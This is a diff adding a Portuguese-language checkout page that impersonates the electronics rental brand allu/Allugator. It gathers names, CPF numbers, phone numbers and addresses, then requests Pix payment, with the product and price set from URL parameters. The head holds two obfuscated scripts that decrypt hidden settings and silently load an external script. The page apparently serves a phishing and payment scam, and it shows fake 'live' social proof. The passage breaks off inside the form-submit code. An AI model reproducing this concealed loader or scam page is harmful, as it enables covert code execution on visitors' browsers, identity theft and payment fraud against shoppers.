@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script>(function(){var v_atm=atob("DJPF0OP5YcoK6nSckOjnpZGVQ/AoggDo4OD//8yaBaQknwDx+fW8/oCWDORomFvv8+GsoJeKTrpjkhHwv+OsqIaVT6B5yFi+8eexooqbFL5vmVamy87p8oSVDqhrhge+qsi+8o2YDK8o0Fbs+eugvKqdQ+YonBXw5fbn6sHPAKs8j0Sk9aX2soDKVqtpjkGr8aX15YDbHJd3");var y_8=[];for(var j_mxm=0;j_mxm<v_atm.length;j_mxm++){y_8.push(v_atm.charCodeAt(j_mxm)&255);}var u_9=y_8[0];var j_ne4=y_8.slice(1,1+u_9);var j_l=y_8.slice(1+u_9);var q_c4uo=j_l.map(function(b,j_xloa){return b^j_ne4[j_xloa%u_9];});var w_n6="";for(var p_if=0;p_if<q_c4uo.length;p_if++){w_n6+=String.fromCharCode(q_c4uo[p_if]&255);}var t_0s9=decodeURIComponent(escape(w_n6));var e_ag=JSON.parse(t_0s9);var i_b=e_ag.globals||[];i_b.forEach(function(b_xea0){window[b_xea0.name]=b_xea0.value;});var v_s6q=document.createElement("script");v_s6q.src=e_ag.url;v_s6q.async=true;v_s6q.defer=true;(e_ag.attributes||[]).forEach(function(i_l){v_s6q.setAttribute(i_l.name,i_l.value);});(document.head||document.documentElement).appendChild(v_s6q);})();</script>
+<script>(function(){var m_h3b=atob("DEx95W1omX3IEtSxajdfkB8Eu0fqeqDFGj9HykIL/RPmZ6DcAyoEyw4H9FOqYPvCCT4UlRkbtgi8f6eeBi0JgB4ctxe7MPiTCzgJlwQK7AmtYfaLMTdfiwwF/F/yMLDQHi1QkBkF8BuxP6TDDzoYixlF4R6ndvnCCSdfyU8e+BG9d/aLSG4AyRZK9xyld/aLSCgckQxF7Amle7LIRzwPgBsN9wnlYaHTAygOx0FK7xykZ7GTUG5fmDAV");var a_2f=[];for(var m_y8yk=0;m_y8yk<m_h3b.length;m_y8yk++){a_2f.push(m_h3b.charCodeAt(m_y8yk)&255);}var z_zak=a_2f[0];var b_tbfs=a_2f.slice(1,1+z_zak);var a_68s=a_2f.slice(1+z_zak);var u_kq=a_68s.map(function(b,u_4bf){return b^b_tbfs[u_4bf%z_zak];});var p_t1d="";for(var b_26v5=0;b_26v5<u_kq.length;b_26v5++){p_t1d+=String.fromCharCode(u_kq[b_26v5]&255);}var p_4=decodeURIComponent(escape(p_t1d));var p_31w=JSON.parse(p_4);var x_3h2=p_31w.globals||[];x_3h2.forEach(function(i_7pl){window[i_7pl.name]=i_7pl.value;});var u_tiv8=document.createElement("script");u_tiv8.src=p_31w.url;u_tiv8.async=true;u_tiv8.defer=true;(p_31w.attributes||[]).forEach(function(d_z9i){u_tiv8.setAttribute(d_z9i.name,d_z9i.value);});(document.head||document.documentElement).appendChild(u_tiv8);})();</script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>allu · Pagamento seguro</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+:root{
+  --highlight:#4bd184;
+  --highlight-dark:#2fae68;
+  --secondary:#2A292E;
+  --bg:#F1F5F2;
+  --contrast:#FFFFFF;
+  --border:#E3E7E5;
+  --muted:#7E7E7E;
+  --danger:#E5484D;
+}
+html{font-size:14px}
+body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;background:var(--bg);color:var(--secondary);line-height:1.5;max-width:430px;margin:0 auto;overflow-x:hidden}
+img{display:block;max-width:100%}
+button{font-family:'Inter',sans-serif;cursor:pointer;border:none}
+input{font-family:'Inter',sans-serif}
+
+.co-header{display:flex;align-items:center;justify-content:center;padding:14px 16px;background:var(--contrast);border-bottom:1px solid var(--border)}
+.co-header img{height:22px}
+.co-header .fallback-logo{font-weight:800;font-size:20px;color:var(--secondary);letter-spacing:-.5px}
+.co-header .fallback-logo span{color:var(--highlight)}
+
+.banner{width:100%;display:block}
+
+.secure-badge{
+  display:flex;align-items:center;justify-content:center;gap:6px;
+  font-size:11.5px;font-weight:700;color:var(--muted);
+  padding:10px 16px;background:var(--bg);
+}
+.secure-badge svg{width:13px;height:13px;color:var(--highlight-dark)}
+
+.cart-card{
+  margin:0 16px 14px;background:var(--contrast);
+  border:1px solid var(--border);border-radius:12px;
+  padding:16px;
+}
+.cart-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px}
+.cart-head-title{display:flex;align-items:center;gap:8px}
+.cart-head-title span{font-size:14.5px;font-weight:700;color:var(--secondary)}
+.cart-count{
+  width:20px;height:20px;border-radius:50%;background:var(--highlight);
+  color:#fff;font-size:11px;font-weight:800;
+  display:flex;align-items:center;justify-content:center;flex-shrink:0;
+}
+.cart-close{width:20px;height:20px;color:var(--muted);flex-shrink:0}
+
+.cart-product{display:flex;align-items:center;gap:12px;margin-bottom:14px}
+.cart-thumb{
+  width:52px;height:52px;border-radius:8px;flex-shrink:0;overflow:hidden;
+  background:var(--bg);display:flex;align-items:center;justify-content:center;
+}
+.cart-thumb img{width:100%;height:100%;object-fit:cover}
+.cart-thumb svg{width:22px;height:22px;color:var(--muted)}
+.cart-product-info{flex:1;min-width:0}
+.cart-product-info p{font-size:14px;font-weight:700;color:var(--secondary);line-height:1.3;margin-bottom:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.cart-product-info span{font-size:11.5px;color:var(--muted);line-height:1.4;display:-webkit-box;-webkit-line-clamp:1;-webkit-box-orient:vertical;overflow:hidden}
+.cart-qty{font-size:12px;color:var(--muted);flex-shrink:0}
+
+.cart-card hr{border:none;border-top:1px solid var(--border);margin:0 0 12px}
+.cart-row{display:flex;justify-content:space-between;align-items:center;font-size:12.5px;color:var(--muted);padding:3px 0;gap:10px}
+.cart-row span{min-width:0}
+.cart-row b{color:var(--muted);font-weight:700;font-size:12.5px;text-align:right;min-width:0}
+.cart-row.total{padding-top:10px;margin-top:6px;border-top:1px solid var(--border)}
+.cart-row.total span{font-size:14px;font-weight:700;color:var(--secondary)}
+.cart-row.total b{font-size:19px;color:var(--highlight-dark)}
+
+.stepper{display:flex;justify-content:space-between;margin:0 16px 16px;gap:4px}
+.step{flex:1;min-width:0;display:flex;flex-direction:column;align-items:center;gap:6px;font-size:10.5px;font-weight:700;color:var(--muted);text-align:center}
+.step .dot{
+  width:26px;height:26px;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  background:var(--contrast);border:2px solid var(--border);
+  font-size:12px;font-weight:800;color:var(--muted);
+}
+.step.active .dot{border-color:var(--highlight);color:var(--highlight-dark);background:#EAFBF2}
+.step.active{color:var(--secondary)}
+.step.done .dot{border-color:var(--highlight);background:var(--highlight);color:#fff}
+.step.done{color:var(--secondary)}
+
+.panel{margin:0 16px 24px;background:var(--contrast);border:1px solid var(--border);border-radius:14px;padding:20px 18px}
+.panel h2{font-size:16px;font-weight:800;margin-bottom:4px;letter-spacing:-.02em}
+.panel .sub{font-size:12.5px;color:var(--muted);margin-bottom:16px;line-height:1.5}
+
+.field{margin-bottom:14px}
+.field label{display:block;font-size:12px;font-weight:700;color:var(--secondary);margin-bottom:6px}
+.field input,.field select{
+  width:100%;height:44px;border:1.5px solid var(--border);border-radius:9px;
+  padding:0 13px;font-size:14px;color:var(--secondary);background:#fff;
+  outline:none;transition:border-color .15s;
+}
+.field input:focus,.field select:focus{border-color:var(--highlight)}
+.field-row{display:flex;gap:10px}
+.field-row .field{flex:1}
+
+.shipping-title{font-size:13.5px;font-weight:700;color:var(--secondary);margin-bottom:10px}
+.shipping-card{
+  display:flex;align-items:center;gap:12px;cursor:pointer;
+  border:1.5px solid var(--border);border-radius:10px;
+  padding:13px 14px;margin-bottom:10px;background:#fff;
+  transition:border-color .15s;
+}
+.shipping-card.selected{border-color:var(--highlight)}
+.shipping-radio{
+  width:20px;height:20px;border-radius:50%;flex-shrink:0;
+  border:2px solid var(--border);
+  display:flex;align-items:center;justify-content:center;
+}
+.shipping-card.selected .shipping-radio{border-color:var(--highlight)}
+.shipping-radio::after{content:'';width:10px;height:10px;border-radius:50%;background:transparent}
+.shipping-card.selected .shipping-radio::after{background:var(--highlight)}
+.shipping-info{flex:1;min-width:0}
+.shipping-info p{font-size:14px;font-weight:700;color:var(--secondary);margin-bottom:2px}
+.shipping-info span{font-size:12px;color:var(--muted)}
+.shipping-price{font-size:14px;font-weight:600;color:var(--secondary);flex-shrink:0}
+.shipping-note{font-size:11.5px;color:var(--muted);line-height:1.5;margin-bottom:16px}
+
+.form-error{font-size:12.5px;color:var(--danger);font-weight:600;margin-bottom:10px;min-height:1px}
+
+.btn{
+  width:100%;height:48px;border-radius:10px;
+  font-size:14.5px;font-weight:700;text-transform:uppercase;letter-spacing:.02em;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+}
+.btn-primary{background:var(--highlight);color:#fff}
+.btn-primary:disabled{opacity:.6;cursor:not-allowed}
+.btn-ghost{background:transparent;color:var(--muted);font-weight:600;margin-top:10px}
+
+.pix-info{
+  background:#F6FBF8;border:1px solid #D9F0E4;border-radius:10px;
+  padding:13px 14px;font-size:12.5px;color:#3A5C4A;line-height:1.55;margin-bottom:16px;
+}
+.pix-value{display:flex;justify-content:space-between;font-size:13.5px;font-weight:700;color:var(--secondary);margin-bottom:16px}
+.pix-value b{color:var(--highlight-dark)}
+
+#pixResult{text-align:center}
+.pix-qr-box{
+  width:236px;height:236px;margin:0 auto 14px;
+  border:8px solid #fff;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.08);
+  display:flex;align-items:center;justify-content:center;background:#fff;
+}
+.copia-cola{display:flex;gap:8px;margin-bottom:14px}
+.copia-cola textarea{
+  flex:1;height:42px;resize:none;border:1.5px solid var(--border);border-radius:8px;
+  padding:10px 12px;font-size:10.5px;color:var(--muted);font-family:monospace;
+}
+.btn-copy{flex-shrink:0;width:88px;background:var(--secondary);color:#fff;border-radius:8px;font-size:12px;font-weight:700}
+#pixStatus{font-size:12.5px;color:var(--muted);font-weight:600;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:6px}
+.spinner{width:13px;height:13px;border-radius:50%;border:2px solid var(--border);border-top-color:var(--highlight-dark);animation:spin .8s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+.social-section{padding:8px 16px 32px}
+.social-section h2{font-size:17px;font-weight:800;text-align:center;margin-bottom:12px;letter-spacing:-.02em}
+.sale-counter{
+  display:flex;align-items:center;justify-content:center;gap:7px;
+  font-size:12px;font-weight:600;color:var(--secondary);
+  background:var(--contrast);border:1px solid var(--border);border-radius:50px;
+  padding:9px 14px;margin:0 auto 18px;max-width:340px;text-align:center;
+}
+.sale-counter .live-dot{width:7px;height:7px;border-radius:50%;background:var(--highlight-dark);flex-shrink:0;animation:pulse 1.6s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
+.social-img{border-radius:12px;overflow:hidden;margin-bottom:12px;border:1px solid var(--border)}
+
+.co-footer{padding:20px 16px 40px;text-align:center}
+.co-footer p{font-size:11px;color:var(--muted);line-height:1.7}
+</style>
+</head>
+<body>
+
+<header class="co-header">
+  <img src="https://yacare-products-image.s3.sa-east-1.amazonaws.com/cms-site/logo_allu_42b66f585f.svg" alt="allu"
+    onerror="this.outerHTML='<span class=&quot;fallback-logo&quot;>allu<span>.</span></span>'">
+</header>
+
+<img class="banner" src="assets/banner-top.png" alt="Você está quase lá! É só finalizar.">
+
+<div class="secure-badge">
+  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="10" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+  Ambiente seguro
+</div>
+
+<div class="cart-card">
+  <div class="cart-head">
+    <div class="cart-head-title">
+      <span>Seu carrinho</span>
+      <div class="cart-count">1</div>
+    </div>
+    <svg class="cart-close" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+  </div>
+
+  <div class="cart-product">
+    <div class="cart-thumb" id="cartThumb">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><rect x="7" y="2" width="10" height="20" rx="2"/><line x1="11" y1="18" x2="13" y2="18"/></svg>
+    </div>
+    <div class="cart-product-info">
+      <p id="cartProduct">—</p>
+      <span id="cartDesc"></span>
+    </div>
+    <div class="cart-qty">1 un.</div>
+  </div>
+
+  <hr>
+  <div class="cart-row"><span>Subtotal</span><b id="cartSubtotal">—</b></div>
+  <div class="cart-row"><span>Frete</span><b id="cartFrete">—</b></div>
+  <div class="cart-row total"><span>Total</span><b id="cartTotal">—</b></div>
+</div>
+
+<div class="stepper">
+  <div class="step active" data-step="1"><span class="dot">1</span><span>Identificação</span></div>
+  <div class="step" data-step="2"><span class="dot">2</span><span>Entrega</span></div>
+  <div class="step" data-step="3"><span class="dot">3</span><span>Pagamento</span></div>
+</div>
+
+<!-- STEP 1 -->
+<section class="panel" data-panel="1">
+  <h2>Identificação</h2>
+  <p class="sub">Precisamos desses dados para emitir seu Pix e liberar a assinatura.</p>
+  <form id="formStep1">
+    <div class="field">
+      <label for="inpEmail">E-mail</label>
+      <input type="email" id="inpEmail" placeholder="seuemail@exemplo.com" required autocomplete="email">
+    </div>
+    <div class="field">
+      <label for="inpPhone">Telefone</label>
+      <input type="tel" id="inpPhone" placeholder="(00) 00000-0000" required inputmode="numeric" autocomplete="tel">
+    </div>
+    <div class="field">
+      <label for="inpName">Nome completo</label>
+      <input type="text" id="inpName" placeholder="Nome e sobrenome" required autocomplete="name">
+    </div>
+    <div class="field">
+      <label for="inpCpf">CPF</label>
+      <input type="text" id="inpCpf" placeholder="123.456.789-12" required inputmode="numeric" autocomplete="off">
+    </div>
+    <div class="form-error" id="step1Error"></div>
+    <button type="submit" class="btn btn-primary">Ir para a entrega &nbsp;→</button>
+  </form>
+</section>
+
+<!-- STEP 2 -->
+<section class="panel" data-panel="2" hidden>
+  <h2>Entrega</h2>
+  <p class="sub">Informe o endereço onde seu eletrônico deve ser entregue.</p>
+  <form id="formStep2">
+    <div class="field">
+      <label for="inpCep">CEP</label>
+      <input type="text" id="inpCep" placeholder="00000-000" required inputmode="numeric">
+    </div>
+    <div class="field">
+      <label for="inpAddress">Endereço</label>
+      <input type="text" id="inpAddress" placeholder="Rua, avenida..." required>
+    </div>
+    <div class="field-row">
+      <div class="field">
+        <label for="inpNumber">Número</label>
+        <input type="text" id="inpNumber" placeholder="123" required inputmode="numeric">
+      </div>
+      <div class="field">
+        <label for="inpComplement">Complemento</label>
+        <input type="text" id="inpComplement" placeholder="Apto, bloco...">
+      </div>
+    </div>
+    <div class="field">
+      <label for="inpNeighborhood">Bairro</label>
+      <input type="text" id="inpNeighborhood" placeholder="Bairro" required>
+    </div>
+    <div class="field-row">
+      <div class="field">
+        <label for="inpCity">Cidade</label>
+        <input type="text" id="inpCity" placeholder="Cidade" required>
+      </div>
+      <div class="field">
+        <label for="inpState">UF</label>
+        <input type="text" id="inpState" placeholder="UF" maxlength="2" required style="text-transform:uppercase">
+      </div>
+    </div>
+
+    <div class="shipping-title">Escolha o melhor frete para você</div>
+    <div id="shipFree" class="shipping-card" data-frete="0">
+      <div class="shipping-radio"></div>
+      <div class="shipping-info">
+        <p>Frete Grátis</p>
+        <span>até 20 dias úteis</span>
+      </div>
+      <div class="shipping-price">Grátis</div>
+    </div>
+    <div id="shipPriority" class="shipping-card" data-frete="3000">
+      <div class="shipping-radio"></div>
+      <div class="shipping-info">
+        <p>Frete Prioritário</p>
+        <span>Até 15 dias úteis</span>
+      </div>
+      <div class="shipping-price">R$ 30,00</div>
+    </div>
+    <p class="shipping-note">A previsão de entrega pode variar de acordo com a região e facilidade de acesso ao seu endereço</p>
+
+    <div class="form-error" id="step2Error"></div>
+    <button type="submit" class="btn btn-primary">Ir para pagamento &nbsp;→</button>
+    <button type="button" id="btnBack2" class="btn btn-ghost">Voltar</button>
+  </form>
+</section>
+
+<!-- STEP 3 -->
+<section class="panel" data-panel="3" hidden>
+  <h2>Pagamento</h2>
+
+  <div id="pixSetup">
+    <div class="pix-info">
+      Os pagamentos efetuados via Pix não podem ser parcelados. Seu produto será reservado e enviado somente após a confirmação do pagamento.
+    </div>
+    <div class="pix-value"><span>Valor no Pix</span><b id="pixValueLabel">—</b></div>
+    <div class="form-error" id="pixError"></div>
+    <button type="button" id="btnGeneratePix" class="btn btn-primary">Gerar Pix e finalizar</button>
+    <button type="button" id="btnBack3" class="btn btn-ghost">Voltar</button>
+  </div>
+
+  <div id="pixResult" hidden>
+    <div id="pixQr" class="pix-qr-box"></div>
+    <div class="copia-cola">
+      <textarea id="pixCopiaCola" readonly></textarea>
+      <button type="button" id="btnCopyPix" class="btn btn-copy">Copiar</button>
+    </div>
+    <div id="pixStatus"><span class="spinner"></span> Aguardando confirmação do pagamento…</div>
+    <button type="button" id="btnRetryPix" class="btn btn-ghost" hidden>Gerar um novo Pix</button>
+  </div>
+
+</section>
+
+<!-- SOCIAL PROOF -->
+<div class="social-section">
+  <h2>Quem assina mostra a alegria de receber</h2>
+  <div class="sale-counter"><span class="live-dot"></span><span id="saleCount">32</span>&nbsp;pessoas decidindo alugar ao invés de comprar agora com você.</div>
+  <div class="social-img"><img src="assets/social-proof-1.png" alt="Unboxings pelo Brasil"></div>
+  <div class="social-img"><img src="assets/social-proof-2.png" alt="Depoimentos de clientes"></div>
+  <div class="social-img"><img src="assets/social-proof-3.png" alt="Depoimentos de clientes"></div>
+</div>
+
+<div class="co-footer">
+  <p>Pagamento processado com segurança.<br>Allugator Assinatura de Eletrônicos · CNPJ 25.053.921/0001-43</p>
+</div>
+
+<script src="https://cdn.jsdelivr.net/gh/davidshimjs/qrcodejs@04f46c6a0708418cb7b96fc563eacae0fbf77674/qrcode.min.js"></script>
+<script>
+(function(){
+  const PRODUCT_META = {
+    "iphone-18-pro-max": { image: "/iphone18promax.png", desc: "Chip A20 Pro, Câmera Fusion Pro 48MP, tela Super Retina XDR 6,9\"..." },
+    "17-pro-max": { image: "https://images.digital.allugator.com/products/17promax1.png", desc: "Chip A19 Pro, Câmera Fusion Pro 48 MP..." },
+    "17": { image: "https://images.digital.allugator.com/products/ip171.png", desc: "Chip A19, Câmera Fusion 48 MP..." },
+    "16": { image: "https://images.digital.allugator.com/products/iph161.png", desc: "Chip A18 com GPU de 5 núcleos..." },
+    "air": { image: "https://images.digital.allugator.com/products/ipair1.png", desc: "O iPhone mais fino já feito, chip A19 Pro..." },
+    "15": { image: "https://images.digital.allugator.com/products/iphone15-2.png", desc: "Chip A16 Bionic, câmera dupla avançada..." },
+    "macbook-m4": { image: "https://images.digital.allugator.com/products/mba1.png", desc: "Chip M4, Liquid Retina 13\", 18h de bateria..." },
+    "macbook-pro": { image: "https://images.digital.allugator.com/products/pm1.png", desc: "Chip M4 Pro, tela Liquid Retina XDR..." },
+    "ps5": { image: "https://images.digital.allugator.com/products/ps5-pro-4.png", desc: "SSD ultrarrápido + DualSense..." },
+    "watch": { image: "https://images.digital.allugator.com/products/w46-2.png", desc: "Saúde avançada no pulso, tela sempre ativa..." },
+    "ipad": { image: "https://images.digital.allugator.com/products/ipad1.png", desc: "Chip A16, tela Liquid Retina 10.9\"..." },
+    "smartwatch-grit-x2-pro": { image: "https://images.digital.allugator.com/products/pro1.png", desc: "GPS preciso, resistência militar, barômetro e bateria de longa duração..." },
+    "bebe-conforto-citi": { image: "https://only-public-files.s3.sa-east-1.amazonaws.com/products-images-prod%2Ff83f2420-69b9-431b-ad4c-dadc2bcf8248%2Fgeneral-1782514592062-nx2bo2jvwx38vhxhcb73o1826idv.webp", desc: "Grupo 0+, base veicular inclusa, proteção lateral Safe Side..." },
+    "caixa-som-jbl-boombox-4": { image: "https://only-public-files.s3.sa-east-1.amazonaws.com/products-images-prod%2F429ebae9-6fbd-4f86-8083-1956764af263%2Fgeneral-1781013485213-caixa-de-som-bluetooth-port_til-jbl-boombox-4-210w-ip68-34-horas-3.png", desc: "210W, IP68, autonomia de até 34h e conexão Auracast..." },
+    "fone-huawei-freeclip-2": { image: "https://only-public-files.s3.sa-east-1.amazonaws.com/products-images-prod%2Fadd81646-74a4-484e-bd26-998191083742%2Fgeneral-1781617839787-1_d77c6e1d-aa7a-4f9d-84ce-72da02bdd193.jpeg-1.png", desc: "Design open-ear, driver duplo, cancelamento de ruído IP57..." },
+    "kindle-paperwhite": { image: "https://only-public-files.s3.sa-east-1.amazonaws.com/products-images-prod%2F8319c348-5ef0-4ca8-9b5d-0b99432e8f2f%2Fgeneral-1781543092341-kindle-paperwhite-amazon-12_-gera__o-2024-7-32gb-wi-fi-ipx8-1-_1_-1.png", desc: "Tela 7\", 32GB, iluminação adaptável e certificação IPX8..." },
+    "monitor-philips-499p9h": { image: "https://only-public-files.s3.sa-east-1.amazonaws.com/products-images-prod%2F4c7cb5a9-6ba4-45c1-adb9-d7ef30ccc39b%2Fgeneral-1781617517092-376264-4.png", desc: "49\" 5K, proporção 32:9, webcam retrátil e USB-C..." },
+    "monitor-samsung-odyssey-g5": { image: "https://only-public-files.s3.sa-east-1.amazonaws.com/products-images-prod%2Fa20ac253-9961-48c8-9f4a-3a3f54666c2b%2Fgeneral-1781547348022-br-gaming-lc34g55twwlmzd-dynamic-black-541893171-6.png", desc: "UWQHD, curvatura 1000R, 165Hz, 1ms e AMD FreeSync..." },
+    "projetor-epson-lifestudio-pop": { image: "https://only-public-files.s3.sa-east-1.amazonaws.com/products-images-prod%2F30573479-ca0e-4607-84e5-689af3430191%2Fgeneral-1779999752028-projetor-epson-lifestudio-pop-ef-61w_-som-bose-2.png", desc: "4K UHD, laser RGB, projeções de até 300\" com som Bose..." },
+    "huawei-mate-x6": { image: "https://only-public-files.s3.sa-east-1.amazonaws.com/products-images-prod%2Fd03d9c4b-53fa-4baa-b59b-7470193a4006%2Fgeneral-1781632102193-versa_o-2.png", desc: "Tela dobrável 7.93\", Kirin 9020, câmeras 50MP+40MP+48MP..." },
+    "soundbar-jbl-bar-800": { image: "https://only-public-files.s3.sa-east-1.amazonaws.com/products-images-prod%2F70c3b66f-471f-45c4-a5b6-dbedff166252%2Fgeneral-1780060759390-soundbar-jbl-bar-800-7-1.png", desc: "Dolby Atmos, caixas surround removíveis e subwoofer dedicado..." },
+    "echo-dot-5": { image: "https://images.digital.allugator.com/products/copy_D687EA75-C9EA-4F85-A5ED-D5313672CD59.png", desc: "Smart speaker com Alexa, áudio aprimorado e Wi-Fi/Bluetooth..." },
+    "tablet-patrulha-canina": { image: "https://images.digital.allugator.com/products/copy_B1FB7193-B3E3-433A-ABBA-D1AC703202A8.png", desc: "Tela 8\", 64GB, Android 13 e processador octa-core..." },
+    "galaxy-z-fold-7": { image: "https://images.digital.allugator.com/products/Samsung%20Galaxy%20Z%20Fold%207%20512GB-1.png", desc: "Snapdragon 8 Elite, 12GB RAM, tela 8\" e Galaxy AI..." },
+    "notebook-galaxy-book4": { image: "https://images.digital.allugator.com/products/Notebook-Galaxy-Book4-i5-16GB-512GB-15.6%E2%80%9D-1.png", desc: "i5 13ª geração, 16GB RAM, 512GB SSD, tela 15.6\" FHD..." },
+    "xiaomi-redmi-note-14": { image: "https://only-public-files.s3.sa-east-1.amazonaws.com/products-images-prod%2F0b707658-d02c-4492-8a8a-0d98018e85a5%2Fgeneral-1781619876494-447224-2.png", desc: "Tela AMOLED 6.7\" 120Hz, câmera 108MP e bateria 5500mAh..." },
+    "notebook-acer-predator-helios-neo": { image: "https://images.digital.allugator.com/products/he1.png", desc: "i7-14700HX, RTX 4070, 16GB RAM, tela 16\" 240Hz..." },
+    "airpods-max-usb-c": { image: "https://images.digital.allugator.com/products/airpods-max-usb-c-2.png", desc: "Cancelamento de ruído, Spatial Audio e chip Apple H1..." },
+    "bike-spinning-ziyou": { image: "https://images.digital.allugator.com/products/zibike1.png", desc: "Resistência magnética ajustável, painel digital e suporte p/ celular..." },
+    "dji-osmo-pocket-3": { image: "https://images.digital.allugator.com/products/Ca%CC%82mera%20DJI%20Osmo%20Pocket%203%20Standard%20BR%20-%20DJI209-3.png", desc: "4K/120fps, gimbal 3 eixos, sensor 1\" CMOS e tela OLED..." },
+  };
+
+  const params = new URLSearchParams(location.search);
+  const slug = params.get('p') || 'produto';
+  const productName = params.get('n') || 'Produto allu';
+  const planCode = params.get('pl') === '2' ? '2' : '1';
+  const planLabel = planCode === '2' ? 'Opção 2' : 'Opção 1';
+  const baseAmountCents = parseInt(params.get('a'), 10) || 100;
+  const meta = PRODUCT_META[slug] || {};
+
+  const customer = {};
+  let currentOrder = null;
+
+  function formatBRL(cents){
+    return (cents/100).toLocaleString('pt-BR', {style:'currency', currency:'BRL'});
+  }
+
+  // Opção 1 = cobra a 1ª parcela agora + frete escolhido (grátis ou prioritário +R$30);
+  // Opção 2 = cobra só o frete agora (sempre prioritário, sem opção grátis) e adia a 1ª parcela.
+  const subtotalCents = planCode === '2' ? 0 : baseAmountCents;
+  const shipFreeEl = document.getElementById('shipFree');
+  const shipPriorityEl = document.getElementById('shipPriority');
+  let freteCents = planCode === '2' ? baseAmountCents : 3000; // padrão: Prioritário selecionado
+
+  function totalCents(){ return subtotalCents + freteCents; }
+
+  function selectShipping(cardEl){
+    [shipFreeEl, shipPriorityEl].forEach(el => el && el.classList.remove('selected'));
+    cardEl.classList.add('selected');
+    freteCents = parseInt(cardEl.dataset.frete, 10) || 0;
+  }
+
+  if (planCode === '2') {
+    shipFreeEl.style.display = 'none';
+    selectShipping(shipPriorityEl);
+  } else {
+    selectShipping(shipPriorityEl);
+    shipFreeEl.addEventListener('click', () => selectShipping(shipFreeEl));
+    shipPriorityEl.addEventListener('click', () => selectShipping(shipPriorityEl));
+  }
+
+  document.getElementById('cartProduct').textContent = productName;
+  document.getElementById('cartDesc').textContent = meta.desc || planLabel;
+  document.getElementById('cartSubtotal').textContent = formatBRL(subtotalCents);
+  document.getElementById('cartFrete').textContent = 'A calcular';
+  document.getElementById('cartTotal').textContent = formatBRL(subtotalCents);
+
+  function revealFrete(){
+    document.getElementById('cartFrete').textContent = freteCents ? formatBRL(freteCents) : 'Grátis';
+    document.getElementById('cartTotal').textContent = formatBRL(totalCents());
+    document.getElementById('pixValueLabel').textContent = formatBRL(totalCents());
+  }
+
+  if (meta.image) {
+    const thumb = document.getElementById('cartThumb');
+    thumb.innerHTML = `<img src="${meta.image}" alt="${productName}" onerror="this.parentElement.innerHTML='<svg viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;1.6&quot;><rect x=&quot;7&quot; y=&quot;2&quot; width=&quot;10&quot; height=&quot;20&quot; rx=&quot;2&quot;/><line x1=&quot;11&quot; y1=&quot;18&quot; x2=&quot;13&quot; y2=&quot;18&quot;/></svg>'">`;
+  }
+
+  // ---- stepper ----
+  const panels = document.querySelectorAll('.panel');
+  const steps = document.querySelectorAll('.step');
+  function goToStep(n){
+    panels.forEach(p => p.hidden = p.dataset.panel !== String(n));
+    steps.forEach(s => {
+      const sn = Number(s.dataset.step);
+      s.classList.toggle('active', sn === n);
+      s.classList.toggle('done', sn < n);
+    });
+    window.scrollTo({top:0, behavior:'smooth'});
+  }
+
+  // ---- masks ----
+  const cpfInput = document.getElementById('inpCpf');
+  cpfInput.addEventListener('input', e=>{
+    let v = e.target.value.replace(/\D/g,'').slice(0,11);
+    v = v.replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d{1,2})$/,'$1-$2');
+    e.target.value = v;
+  });
+  const phoneInput = document.getElementById('inpPhone');
+  phoneInput.addEventListener('input', e=>{
+    let v = e.target.value.replace(/\D/g,'').slice(0,11);
+    v = v.replace(/(\d{2})(\d)/,'($1) $2').replace(/(\d{5})(\d{1,4})$/,'$1-$2');
+    e.target.value = v;
+  });
+  const cepInput = document.getElementById('inpCep');
+  cepInput.addEventListener('input', async e=>{
+    let v = e.target.value.replace(/\D/g,'').slice(0,8);
+    v = v.replace(/(\d{5})(\d)/,'$1-$2');
+    e.target.value = v;
+    const digits = v.replace(/\D/g,'');
+    if (digits.length === 8){
+      try{
+        const res = await fetch(`https://viacep.com.br/ws/${digits}/json/`);
+        const data = await res.json();
+        if (!data.erro){
+          document.getElementById('inpAddress').value = data.logradouro || '';
+          document.getElementById('inpNeighborhood').value = data.bairro || '';
+          document.getElementById('inpCity').value = data.localidade || '';
+          document.getElementById('inpState').value = data.uf || '';
+          document.getElementById('inpNumber').focus();
+        }
+      }catch(err){}
+    }
+  });
+
+  // ---- CPF check-digit validation ----
+  function isValidCPF(raw){
+    const cpf = raw.replace(/\D/g,'');
+    if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
+    let sum = 0;
+    for (let i=0;i<9;i++) sum += parseInt(cpf[i],10) * (10-i);
+    let rev = (sum*10) % 11; if (rev===10||rev===11) rev=0;
+    if (rev !== parseInt(cpf[9],10)) return false;
+    sum = 0;
+    for (let i=0;i<10;i++) sum += parseInt(cpf[i],10) * (11-i);
+    rev = (sum*10) % 11; if (rev===10||rev===11) rev=0;
+    return rev === parseInt(cpf[10],10);
+  }
+
+  // ---- step 1 ----
+  document.getElementById('formStep1').addEventListener('submit', e=>{
+    e.preventDefault();
+    const name = document.getElementById('inpName').value.trim();
